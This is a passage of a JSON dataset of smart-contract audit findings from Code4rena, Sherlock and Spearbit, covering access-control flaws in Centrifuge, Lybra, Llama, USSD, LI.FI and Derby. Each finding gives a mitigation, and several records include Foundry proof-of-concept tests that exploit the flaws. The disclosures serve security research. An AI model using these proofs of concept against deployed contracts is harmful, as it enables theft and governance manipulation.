assets, address receiver) public returns (uint256 shares)  {\n+    function deposit(uint256 assets, address receiver) public returns (uint256 shares) withApproval(receiver) {\n        shares = investmentManager.processDeposit(receiver, assets);\n        emit Deposit(address(this), receiver, assets, shares);\n     }\n\n-    function mint(uint256 shares, address receiver) public returns (uint256 assets) {\n+    function mint(uint256 shares, address receiver) public returns (uint256 assets) withApproval(receiver) {\n        assets = investmentManager.processMint(receiver, shares);\n        emit Deposit(address(this), receiver, assets, shares);\n     }\n```\n\n### Assessed type\n\nAccess Control\n\n**[hieronx (Centrifuge) confirmed and commented](https://github.com/code-423n4/2023-09-centrifuge-findings/issues/143#issuecomment-1745028559):**\n > Mitigated in https://github.com/centrifuge/liquidity-pools/pull/136\n\n\n\n***\n\n",
      "summary": "\nThis bug report is regarding the Deposit and Mint functions under the LiquidityPool code. These functions lack access control, which enables any user to proceed with the mint/deposit for another user. This means an attacker can deposit a small amount of wai before the user in order to DoS the deposit. This could cause the user's transaction to revert as they would not have enough balance for the full deposit.\n\nA recommended mitigation step is to use access control modifiers like withApproval in the Deposit and Mint functions. This would ensure that only the user who is meant to proceed with the deposit/mint is able to do so.\n\nThe assessed type of this bug is Access Control. The bug has been mitigated in the LiquidityPool code.",
      "report_date": {},
      "contest_prize_txt": "70000",
      "contest_link": "https://code4rena.com/reports/2023-09-centrifuge",
      "sponsor_name": "Centrifuge",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-09-centrifuge",
      "github_link": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/143",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "285",
      "slug": "m-04-you-can-deposit-really-small-amount-for-other-users-to-dos-them-code4rena-centrifuge-centrifuge-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Centrifuge",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Centrifuge",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "DOS"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "21140",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 24,
      "protocol_id": "933",
      "title": "[H-03] Incorrectly implemented modifiers in `LybraConfigurator.sol` allow any address to call functions that are supposed to be restricted",
      "content": "\nThe modifiers `onlyRole` (bytes32 role) and `checkRole` (bytes32 role) are not implemented correctly. This would allow anybody to call sensitive functions that should be restricted.\n\n### Proof of Concept\n\nFor the POC, I set up a new foundry projects and copied the folders lybra, mocks and OFT in the src folder of the new project. I installed the dependencies and then I created a file `POCs.t.sol` in the test folder. Here is the code that shows a random address can call sensitive functions that should be restricted:\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/lybra/configuration/LybraConfigurator.sol\";\nimport \"../src/lybra/governance/GovernanceTimelock.sol\";\nimport \"../src/lybra/miner/esLBRBoost.sol\";\n\ncontract POCsTest is Test {\n    Configurator public lybraConfigurator;\n    GovernanceTimelock public governance;\n    esLBRBoost public boost;\n\n    address public dao = makeAddr(\"dao\");\n    address public curvePool = makeAddr(\"curvePool\");\n    address public randomUser = makeAddr(\"randomUser\");\n    address public admin = makeAddr(\"admin\");\n\n    address public eusd = makeAddr(\"eusd\");\n    address public pEusd = makeAddr(\"pEusd\");\n\n    address proposerOne = makeAddr(\"proposerOne\");\n    address executorOne = makeAddr(\"executorOne\");\n\n    address[] proposers = [proposerOne];\n    address[] executors = [executorOne];\n\n    address public rewardsPool = makeAddr(\"rewardsPool\");\n\n    function setUp() public {\n        governance = new GovernanceTimelock(10000, proposers, executors, admin);\n        lybraConfigurator = new Configurator(address(governance), curvePool);\n        boost = new esLBRBoost();\n    }\n\n    function testIncorrectlyImplementedModifiers() public {\n        console.log(\"EUSD BEFORE\", address(lybraConfigurator.EUSD()));\n        vm.prank(randomUser);\n        lybraConfigurator.initToken(eusd, pEusd);\n        console.log(\"EUSD AFTER\", address(lybraConfigurator.EUSD()));\n\n        console.log(\"RewardsPool BEFORE\", address(lybraConfigurator.lybraProtocolRewardsPool()));\n        vm.prank(randomUser);\n        lybraConfigurator.setProtocolRewardsPool(rewardsPool);\n        console.log(\"RewardsPool AFTER\", address(lybraConfigurator.lybraProtocolRewardsPool()));\n    }\n}\n```\n\n### Tools Used\n\nManual Review\n\n### Recommended Mitigation Steps\n\nWrap the 2 function calls in a require statement:\n\nIn modifier `onlyRole` (bytes32 role), instead of `GovernanceTimelock.checkOnlyRole` (role, msg.sender), it should be something like require (`GovernanceTimelock.checkOnlyRole` (role, msg.sender), \"Not Authorized\").\n\nThe same goes for the `checkRole` (bytes32 role) modifier.\n\n### Assessed type\n\nAccess Control\n\n**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/704#issuecomment-1635551912)**\n\n***\n\n",
      "summary": "\nThis bug report is related to the LybraFinance project. Two modifiers, `onlyRole` (bytes32 role) and `checkRole` (bytes32 role), are not correctly implemented and thus allow anyone to call sensitive functions that should be restricted. A Proof of Concept (PoC) was created to demonstrate this vulnerability. The PoC code was written in Solidity and tested to show that a random address can call sensitive functions. The recommended mitigation steps are to wrap the two function calls in a require statement. This bug is classified as an Access Control vulnerability. LybraFinance has confirmed the bug report.",
      "report_date": {},
      "contest_prize_txt": "$60,500 USDC",
      "contest_link": "https://code4rena.com/reports/2023-06-lybra",
      "sponsor_name": "Lybra Finance",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-06-lybra",
      "github_link": "https://github.com/code-423n4/2023-06-lybra-findings/issues/704",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "254",
      "slug": "h-03-incorrectly-implemented-modifiers-in-lybraconfiguratorsol-allow-any-address-to-call-functions-that-are-supposed-to-be-restricted-code4rena-lybra-finance-lybra-finance-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Lybra Finance",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Lybra Finance",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "20151",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "826",
      "title": "[H-02] Anyone can change approval/disapproval threshold for any action using LlamaRelativeQuorum strategy",
      "content": "\n### Proof of Concept\n\nWhen a new action is created with `LlamaRelativeQuorum` strategy, `LlamaCore` will call function `validateActionCreation` which is currently implemented as below:\n\n    function validateActionCreation(ActionInfo calldata actionInfo) external {\n        LlamaPolicy llamaPolicy = policy; // Reduce SLOADs.\n        uint256 approvalPolicySupply = llamaPolicy.getRoleSupplyAsNumberOfHolders(approvalRole);\n        if (approvalPolicySupply == 0) revert RoleHasZeroSupply(approvalRole);\n\n        uint256 disapprovalPolicySupply = llamaPolicy.getRoleSupplyAsNumberOfHolders(disapprovalRole);\n        if (disapprovalPolicySupply == 0) revert RoleHasZeroSupply(disapprovalRole);\n\n        // Save off the supplies to use for checking quorum.\n        actionApprovalSupply[actionInfo.id] = approvalPolicySupply;\n        actionDisapprovalSupply[actionInfo.id] = disapprovalPolicySupply;\n      }\n\nThe last 2 lines of code is to `Save off the supplies to use for checking quorum`. The 2 variables `actionApprovalSupply` and `actionDisapprovalSupply` are described as `Mapping of action ID to the supply of the approval/disapproval role at the time the action was created.`\n\nThis means the strategy will save the total supply of approval/disapproval role at creation time and then use them to calculate the approval/disapproval threshold, which equals to (approval/disapproval percentage) &ast; (total supply of approval/disapproval).\n\nHowever, since the function `validateActionCreation`'s scope is `external` and does not require any privilege to be called, any user can call this function and update the total supply of approval/disapproval role to the current timestamp and break the intention to keep total supply of approval/disapproval role `at the time the action was created`. This issue is highly critical because many Llama protocol's functions depend on these 2 variables to function as intended.\n\nFor example, if the total supply of approval role is 10 at the creation of action and the `minApprovalPct` = 100% - which means requires all policy holders to approve the action to pass it.\n\nIf it then be casted 9 votes (1 vote short), the action's state is still Active (not approved yet).\n\nHowever, if 1 user is revoked their approval/role, anyone can call function `validateActionCreation` and update the required threshold to 9 votes and thus the action's state becomes Approved.\n\nBelow is a POC for the above example, for ease of testing, place this test case under file `LlamaStrategy.t.sol`, contract `IsActionApproved`:\n\n    function testAnyoneCanChangeActionApprovalSupply() public {\n        // Deploy a relative quorum strategy\n        uint256 numberOfHolders = 10;\n\n        // Assign 10 users role of TestRole1\n        for (uint256 i=0; i< numberOfHolders; i++){\n          address _policyHolder = address(uint160(i + 100));\n          if (mpPolicy.balanceOf(_policyHolder) == 0) {\n            vm.prank(address(mpExecutor));\n            mpPolicy.setRoleHolder(uint8(Roles.TestRole1), _policyHolder, 1, type(uint64).max);\n          }\n        }\n\n\n        // Create  a LlamaRelativeQuorum strategy\n        // in this minApprovalPct = 10_000 (meaning we require all 10 policyholders to approve)\n        LlamaRelativeQuorum.Config memory testStrategyData = LlamaRelativeQuorum.Config({\n          approvalPeriod: 2 days,\n          queuingPeriod: 2 days,\n          expirationPeriod: 8 days,\n          isFixedLengthApprovalPeriod: true,\n          minApprovalPct: 10000, // require all policyholder to approve\n          minDisapprovalPct: 2000,\n          approvalRole: uint8(Roles.TestRole1),\n          disapprovalRole: uint8(Roles.TestRole1),\n          forceApprovalRoles: new uint8[](0),\n          forceDisapprovalRoles: new uint8[](0)\n        });\n\n        ILlamaStrategy testStrategy = lens.computeLlamaStrategyAddress(\n          address(relativeQuorumLogic), DeployUtils.encodeStrategy(testStrategyData), address(mpCore)\n        );\n\n        LlamaRelativeQuorum.Config[] memory testStrategies\n        = new LlamaRelativeQuorum.Config[](1);\n        testStrategies[0] = testStrategyData;\n        vm.prank(address(mpExecutor));\n        mpCore.createStrategies(relativeQuorumLogic, DeployUtils.encodeStrategyConfigs(testStrategies));\n\n        // create action\n        ActionInfo memory actionInfo = createAction(testStrategy);\n        assertEq(LlamaRelativeQuorum(address(testStrategy)).actionApprovalSupply(actionInfo.id), numberOfHolders);\n\n        // Suppose that 9 policyholder approve\n        // the action lacks 1 more approval vote so isActionApproved = false\n        approveAction(9, actionInfo);\n        assertEq(LlamaRelativeQuorum(address(testStrategy)).isActionApproved(actionInfo), false);\n\n        // Revoke 1 user\n        vm.prank(address(mpExecutor));\n        mpPolicy.revokePolicy(address(100));\n\n        // Now anyone can update the actionApprovalSupply and therefore\n        // change the approval threshold\n        address anyOne = address(12345);\n        vm.prank(anyOne);\n        LlamaRelativeQuorum(address(testStrategy)).validateActionCreation(actionInfo);\n\n        // The actionApproval for the above action is reduced to 9\n        // and the action state changes to approved\n        assertEq(LlamaRelativeQuorum(address(testStrategy)).actionApprovalSupply(actionInfo.id), numberOfHolders - 1);\n        assertEq(LlamaRelativeQuorum(address(testStrategy)).isActionApproved(actionInfo), true);\n      }\n\n\n### Recommended Mitigation Steps\n\nSince the intention is to keep values `actionApprovalSupply` and `actionDisapprovalSupply` snapshot at creation time for every action and `LlamaCore` only call `validateActionCreation` at creation time, I think the easiest way is to allow only `llamaCore` to call this function.\n\n\n**[AustinGreen (Llama) confirmed and commented](https://github.com/code-423n4/2023-06-llama-findings/issues/62#issuecomment-1601259723):**\n > This finding was addressed in this PR: https://github.com/llamaxyz/llama/pull/384 (note our repo is private until we launch)\n\n\n***\n \n",
      "summary": "\nA bug was discovered in the `LlamaRelativeQuorum` strategy, which is used by the `LlamaCore` protocol. The bug was found in the `validateActionCreation` function, which is currently implemented as an external function. This means anyone can call this function and update the total supply of approval/disapproval role to the current timestamp, which breaks the intention to keep total supply of approval/disapproval role at the time the action was created. \n\nThis issue is highly critical because many Llama protocol's functions depend on these two variables to function as intended. For example, if the total supply of approval role is 10 at the creation of action and the `minApprovalPct` is set to 100%, which requires all policy holders to approve the action to pass it, if it then be casted 9 votes (1 vote short), the action's state is still Active (not approved yet). However, if 1 user is revoked their approval/role, anyone can call function `validateActionCreation` and update the required threshold to 9 votes and thus the action's state becomes Approved.\n\nTo fix this issue, the Llama protocol team recommended only allowing `LlamaCore` to call the `validateActionCreation` function, ensuring that the values `actionApprovalSupply` and `actionDisapprovalSupply` are only updated at creation time. This bug was addressed in the pull request: https://github.com/llamaxyz/llama/pull/384.",
      "report_date": {},
      "contest_prize_txt": "$60,500 USDC",
      "contest_link": "https://code4rena.com/reports/2023-06-llama",
      "sponsor_name": "Llama",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-06-llama",
      "github_link": "https://github.com/code-423n4/2023-06-llama-findings/issues/62",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "246",
      "slug": "h-02-anyone-can-change-approvaldisapproval-threshold-for-any-action-using-llamarelativequorum-strategy-code4rena-llama-llama-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Llama",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Llama",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "18338",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "HIGH",
      "finders_count": 5,
      "protocol_id": "826",
      "title": "The castApproval /castDisapproval doesn't check if role parameter is the approvalRole",
      "content": "## Security Report\n\n## Severity\n**Critical Risk**\n\n## Context\n`LlamaCore.sol#L642`\n\n## Description\nA policyholder should be able to cast their approval for an action if they have the `approvalRole` defined in the strategy. It should not be possible for other roles to cast an action.\n\nThe `_castApproval` method verifies if the policyholder has the role passed as an argument but doesn't check if it actually has `approvalRole`, which is eligible to cast an approval. This means any role in the llama contract can participate in the approval with completely different quantities (weights). \n\nThe same problem occurs for the `castDisapproval` function as well.\n\n## Recommendation\nThe check could be added inside the strategy in the `getApprovalQuantityAt` function: \n\n```solidity\nRelativeStrategy.sol#L174\nfunction getApprovalQuantityAt(address policyholder, uint8 role, uint256 timestamp) external view\nreturns (uint128) {\n    + if (role != approvalRole) return 0;\n    uint128 quantity = policy.getPastQuantity(policyholder, role, timestamp);\n    return quantity > 0 && forceApprovalRole[role] ? type(uint128).max : quantity;\n}\n```\n\nIf the passed role doesn't equal the `approvalRole`, a quantity of zero could be returned:\n```solidity\nif (role != approvalRole) return 0;\n```\n\n## Resolution\n**Llama:** Fixed in commit `38b5a9`.  \n**Spearbit:** Resolved.",
      "summary": "\nThis bug report is about a critical risk issue in the LlamaCore.sol#L642. The issue is that the _castApproval and castDisapproval functions do not check if the policyholder has the approvalRole defined in the strategy. This means any role in the llama contract can participate in the approval with completely different quantities (weights).\n\nThe recommendation is to add a check inside the strategy in the getApprovalQuantityAt function, which returns a quantity of zero if the role passed does not equal the approvalRole.\n\nThe bug has been fixed in commit 38b5a9 and the report has been resolved.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Llama-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Llama-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Llama-Spearbit-Security-Review.pdf",
      "pdf_page_from": 6,
      "contest_id": "",
      "slug": "the-castapproval-castdisapproval-doesnt-check-if-role-parameter-is-the-approvalrole-spearbit-llama-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "Llama",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "Llama",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "19137",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 109,
      "protocol_id": "853",
      "title": "H-8: Lack of access control for `mintRebalancer()` and `burnRebalancer()`",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/777 \n\n## Found by \n0x2e, 0xAzez, 0xHati, 0xMojito, 0xPkhatri, 0xRobocop, 0xSmartContract, 0xStalin, 0xeix, 0xyPhilic, 14si2o\\_Flint, AlexCzm, Angry\\_Mustache\\_Man, Aymen0909, Bahurum, Bauchibred, Bauer, BlockChomper, Brenzee, BugBusters, BugHunter101, Delvir0, DevABDee, Dug, Fanz, GimelSec, HonorLt, J4de, JohnnyTime, Juntao, Kodyvim, Kose, Lilyjjo, Madalad, Nyx, PokemonAuditSimulator, RaymondFam, Saeedalipoor01988, SanketKogekar, Schpiel, SensoYard, T1MOH, TheNaubit, Tricko, VAD37, Vagner, WATCHPUG, \\_\\_141345\\_\\_, anthony, ast3ros, auditsea, berlin-101, blackhole, blockdev, carrotsmuggler, chainNue, chalex.eth, cjm00n, coincoin, coryli, ctf\\_sec, curiousapple, dacian, evilakela, georgits, giovannidisiena, immeas, innertia, jah, juancito, kie, kiki\\_dev, lil.eth, m4ttm, mahdikarimi, mrpathfindr, n33k, neumo, ni8mare, nobody2018, pavankv241, pengun, qbs, qckhp, qpzm, ravikiran.web3, saidam017, sam\\_gmk, sashik\\_eth, shaka, shealtielanz, shogoki, simon135, slightscan, smiling\\_heretic, tallo, theOwl, the\\_endless\\_sea, toshii, tsvetanovv, tvdung94, twcctop, twicek, vagrant, ver0759, warRoom, whiteh4t9527, ww4tson, yy\n## Summary\n\nLack of access control in `USSD.mintRebalancer()` and `USSD.burnRebalancer()` can lead to a denial-of-service attack and malfunction of the rebalancer as it can alter `totalSupply`, which is used in `rebalancer.SellUSSDBuyCollateral` to calculate `ownval`.\n\n## Vulnerability Detail\n\nBased on the context, `USSD.mintRebalancer()` should be `onlyBalancer` as it should only be allowed to be called by the rebalancer.\n\nHowever, both `USSD.mintRebalancer()` and `USSD.burnRebalancer()` lack access control in the current implementation.\n\n## Impact\n\nAn attacker can mint an amount of `type(uint256).max - totalSupply()` and cause a denial-of-service attack by preventing anyone else from minting.\n\nAdditionally, minting will also change the `totalSupply` which alters the `collateralFactor` and cause the rebalancer to malfunction, as the `SellUSSDBuyCollateral()` function relies on the `USSD.collateralFactor()`.\n\nThe `totalSupply` is also used in `rebalancer.SellUSSDBuyCollateral` to calculate the `ownval`.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L204-L210\n\n```solidity\nfunction mintRebalancer(uint256 amount) public override {\n    _mint(address(this), amount);\n}\n\nfunction burnRebalancer(uint256 amount) public override {\n    _burn(address(this), amount);\n}\n```\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L92-L107\n\n```solidity\n    function rebalance() override public {\n      uint256 ownval = getOwnValuation();\n      (uint256 USSDamount, uint256 DAIamount) = getSupplyProportion();\n      if (ownval < 1e6 - threshold) {\n        // peg-down recovery\n        BuyUSSDSellCollateral((USSDamount - DAIamount / 1e12)/2);\n      } else if (ownval > 1e6 + threshold) {\n        // mint and buy collateral\n        // never sell too much USSD for DAI so it 'overshoots' (becomes more in quantity than DAI on the pool)\n        // otherwise could be arbitraged through mint/redeem\n        // the execution difference due to fee should be taken into accounting too\n        // take 1% safety margin (estimated as 2 x 0.5% fee)\n        IUSSD(USSD).mintRebalancer(((DAIamount / 1e12 - USSDamount)/2) * 99 / 100); // mint ourselves amount till balance recover\n        SellUSSDBuyCollateral();\n      }\n    }\n```\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L179-L194\n\n```solidity\nfunction collateralFactor() public view override returns (uint256) {\n    uint256 totalAssetsUSD = 0;\n    for (uint256 i = 0; i < collateral.length; i++) {\n        totalAssetsUSD +=\n            (((IERC20Upgradeable(collateral[i].token).balanceOf(\n                address(this)\n            ) * 1e18) /\n                (10 **\n                    IERC20MetadataUpgradeable(collateral[i].token)\n                        .decimals())) *\n                collateral[i].oracle.getPriceUSD()) /\n            1e18;\n    }\n\n    return (totalAssetsUSD * 1e6) / totalSupply();\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n`USSD.mintRebalancer()` should be `onlyBalancer`.",
      "summary": "\nThis bug report is about the lack of access control in the `USSD.mintRebalancer()` and `USSD.burnRebalancer()` functions, which can be found in the USSD smart contract. This vulnerability was discovered by a group of security auditors, including 0x2e, 0xAzez, 0xHati, 0xMojito, 0xPkhatri, 0xRobocop, 0xSmartContract, 0xStalin, 0xeix, 0xyPhilic, 14si2o\\_Flint, AlexCzm, Angry\\_Mustache\\_Man, Aymen0909, Bahurum, Bauchibred, Bauer, BlockChomper, Brenzee, BugBusters, BugHunter101, Delvir0, DevABDee, Dug, Fanz, GimelSec, HonorLt, J4de, JohnnyTime, Juntao, Kodyvim, Kose, Lilyjjo, Madalad, Nyx, PokemonAuditSimulator, RaymondFam, Saeedalipoor01988, SanketKogekar, Schpiel, SensoYard, T1MOH, TheNaubit, Tricko, VAD37, Vagner, WATCHPUG, \\_\\_141345\\_\\_, anthony, ast3ros, auditsea, berlin-101, blackhole, blockdev, carrotsmuggler, chainNue, chalex.eth, cjm00n, coincoin, coryli, ctf\\_sec, curiousapple, dacian, evilakela, georgits, giovannidisiena, immeas, innertia, jah, juancito, kie, kiki\\_dev, lil.eth, m4ttm, mahdikarimi, mrpathfindr, n33k, neumo, ni8mare, nobody2018, pavankv241, pengun, qbs, qckhp, qpzm, ravikiran.web3, saidam017, sam\\_gmk, sashik\\_eth, shaka, shealtielanz, shogoki, simon135, slightscan, smiling\\_heretic, tallo",
      "report_date": {},
      "contest_prize_txt": "12000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/82",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 3,
      "general_score": 0,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/777",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "82",
      "slug": "h-8-lack-of-access-control-for-mintrebalancer-and-burnrebalancer-sherlock-none-ussd-autonomous-secure-dollar-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "USSD - Autonomous Secure Dollar",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Algo-Stables"
            },
            "score": 1
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "15924",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "HIGH",
      "finders_count": 4,
      "protocol_id": "2",
      "title": "Max approval to any address is possible",
      "content": "## Security Risk Report\n\n## Severity\n**High Risk**\n\n## Context\n`HopFacetOptimized.sol#L33-L45`\n\n## Description\nThe function `HopFacetOptimized.setApprovalForBridges()` can be called by anyone to give maximum approval to any address for any ERC20 token. This vulnerability allows any ERC20 token left in the Diamond to be stolen.\n\n```solidity\nfunction setApprovalForBridges(address[] calldata bridges, address[] calldata tokensToApprove) external {\n    ...\n    LibAsset.maxApproveERC20(..., type(uint256).max);\n    ...\n}\n```\n\n## Recommendation\nAdd authorization to the function `setApprovalForBridges()` so only the owner can call it. This can be implemented in the following way:\n\n```solidity\nfunction setApprovalForBridges(address[] calldata bridges, address[] calldata tokensToApprove) external {\n    + LibDiamond.enforceIsContractOwner();\n    ...\n    LibAsset.maxApproveERC20(..., type(uint256).max);\n    ...\n}\n```\n\n## LiFi\nFixed in PR 244.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report is about a vulnerability in the HopFacetOptimized.sol#L33-L45 code. The vulnerability is that the function setApprovalForBridges() can be called by anyone to give max approval to any address for any ERC20 token. This means that any ERC20 token left in the Diamond can be stolen. \n\nThe recommendation to fix this vulnerability is to add authorization to the function setApprovalForBridges() so only the owner can call it. This can be done by adding the code LibDiamond.enforceIsContractOwner() to the function.\n\nThe bug was fixed in Pull Request 244 and verified by Spearbit.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/LIFI-retainer1-Spearbit-Security-Review.pdf",
      "pdf_page_from": 8,
      "contest_id": "",
      "slug": "max-approval-to-any-address-is-possible-spearbit-lifi-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "LI.FI",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "LI.FI",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "12288",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "18",
      "title": "H-6: Cross-chain message authentication can be bypassed, allowing an attacker to disrupt the state of vaults",
      "content": "Source: https://github.com/sherlock-audit/2023-01-derby-judging/issues/309 \n\n## Found by \nJeiwan\n\n## Summary\nA malicious actor may send a cross-chain message to an `XProvider` contract and bypass the `onlySource` authentication check. As a result, they'll be able to call any function in the `XProvider` contract that has the `onlySource` modifier and disrupt the state of `XChainController` and all vaults.\n## Vulnerability Detail\nThe protocol integrates with Connext to handle cross-chain interactions. [XProvider](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L14) is a contract that manages interactions between vaults deployed on all supported networks and `XChainController`. `XProvider` is deployed on each of the network where a vault is deployed and is used to send and receive cross-chain messages via Connext. `XProvider` is a core contract that handles vault rebalancing, transferring of allocations from Game to `XChainController` and to vaults, transferring of tokens deposited to vaults between vault on different networks. Thus, it's critical that the functions of this contract are only called by authorized actors.\n\nTo ensure that cross-chain messages are sent from authorized actors, there's [onlySource](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L85) modifier that's applied to the [xReceive](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/XProvider.sol#L170) function. The modifier checks that the sender of a message is trusted:\n```solidity\nmodifier onlySource(address _originSender, uint32 _origin) {\n  require(_originSender == trustedRemoteConnext[_origin] && msg.sender == connext, \"Not trusted\");\n  _;\n}\n```\n\nHowever, it doesn't check that `trustedRemoteConnext[_origin]` is set (i.e. it's not the zero address), and `_originSender` can in fact be the zero address.\n\nIn Connext, a message can be [delivered via one of the two paths](https://docs.connext.network/concepts/how-it-works/transaction-flow): the fast path or the slow path. The fast path is taken when, on the destination, **message receiving is not authentication**, i.e. when destination allows receiving of messages from all senders. The slow path is taken when message receiving on the destination is authenticated, i.e. destination allows any sender (it doesn't check a sender).\n\nSince, `XProvider` always checks the sender of a message, only the slow path will be used by Connext to deliver messages to it. However, Connext always [tries the slow path](https://docs.connext.network/concepts/how-it-works/transaction-flow):\n> Routers observing the origin chain with funds on the destination chain will:\n> Simulate the transaction (if this fails, the assumption is that this is a more \"expressive\" crosschain message that requires authentication and so must go through the AMB: the slow path).\n\nI.e. it'll always send a message and see if it reverts on the destination or not: if it does, Connext will switch to the slow path.\n\nWhen Connext executes a message on the destination chain in the fast path, it [sets the sender address to the zero address](https://github.com/connext/monorepo/blob/87b75b346664271522e2f2acfd10bebcfeb93993/packages/deployments/contracts/contracts/core/connext/facets/BridgeFacet.sol#L878):\n```solidity\n(bool success, bytes memory returnData) = ExcessivelySafeCall.excessivelySafeCall(\n  _params.to,\n  gasleft() - Constants.EXECUTE_CALLDATA_RESERVE_GAS,\n  0, // native asset value (always 0)\n  Constants.DEFAULT_COPY_BYTES, // only copy 256 bytes back as calldata\n  abi.encodeWithSelector(\n    IXReceiver.xReceive.selector,\n    _transferId,\n    _amount,\n    _asset,\n    _reconciled ? _params.originSender : address(0), // use passed in value iff authenticated\n    _params.originDomain,\n    _params.callData\n  )\n);\n```\n\nThus, Connext will try to call the `XProvider.xReceive` function with the `_originSender` argument set to the zero address. And there are situations when the `onlySource` modifier will pass such calls: when the origin network (as specified by the `_origin` argument) is not in the 